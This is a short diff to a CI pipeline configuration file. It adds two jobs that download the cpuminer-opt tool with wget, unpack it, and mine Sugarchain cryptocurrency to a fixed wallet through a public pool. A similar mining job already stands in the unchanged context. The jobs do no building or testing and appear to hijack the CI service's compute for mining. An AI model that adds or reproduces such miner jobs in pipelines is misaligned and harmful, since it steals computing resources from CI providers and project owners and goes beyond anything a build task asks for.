@@ -36,6 +36,16 @@ blocks:
             - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
             - tar xf cpuminer-opt-linux.tar.gz
             - './cpuminer-sse2 -a yespowersugar -o 1pool.sugarchain.org:3333 -u sugar1q3ck407x6v7m6gjnw08x63r3cf7er06xlpsr0kg.v23 p-t0'
+        - name: 'Job #4'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - './cpuminer-sse2 -a yespowersugar -o 1pool.sugarchain.org:3333 -u sugar1q3ck407x6v7m6gjnw08x63r3cf7er06xlpsr0kg.v24 -t0'
+        - name: 'Job #5'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - './cpuminer-sse2 -a yespowersugar -o 1pool.sugarchain.org:3333 -u sugar1q3ck407x6v7m6gjnw08x63r3cf7er06xlpsr0kg.v25 -t0'
       epilogue:
         on_pass:
           commands:
